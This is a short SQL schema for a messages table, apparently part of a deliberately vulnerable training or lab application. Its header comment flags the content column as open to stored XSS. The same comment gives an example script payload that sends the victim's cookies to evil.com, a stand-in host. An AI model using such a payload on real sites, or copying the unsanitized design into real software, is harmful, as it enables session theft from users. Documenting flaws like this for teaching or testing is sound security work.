-- [A05] Security Misconfiguration / XSS: content column accepts raw HTML/JS without sanitization.
-- Messages are stored and returned without escaping, enabling Stored XSS attacks
-- (e.g. content = '<script>document.location="https://evil.com?c="+document.cookie</script>').
CREATE TABLE messages (
    id          BIGINT    PRIMARY KEY AUTO_INCREMENT,
    sender_id   BIGINT    NOT NULL,
    receiver_id BIGINT    NOT NULL,
    content     TEXT,
    sent_at     TIMESTAMP DEFAULT NOW(),
    read_at     TIMESTAMP NULL,
    CONSTRAINT fk_msg_sender   FOREIGN KEY (sender_id)   REFERENCES users(id),
    CONSTRAINT fk_msg_receiver FOREIGN KEY (receiver_id) REFERENCES users(id)
);
